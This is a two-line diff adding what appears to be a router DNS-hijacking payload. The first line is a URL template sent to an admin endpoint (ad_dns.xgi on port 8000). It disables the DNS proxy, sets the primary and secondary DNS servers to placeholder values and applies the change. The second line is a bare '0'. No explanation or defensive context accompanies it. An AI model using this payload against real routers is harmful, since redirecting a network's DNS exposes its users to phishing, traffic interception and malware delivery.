@@ -1,0 +1,2 @@
+http://+target:8000/ADVANCED/ad_dns.xgi?&set/dproxy/enable=0&set/dns/mode=4&set/dns/server/primarydns=+var0&set/dns/server/secondarydns=+var1&CMT=0&EXE=DNS
+0
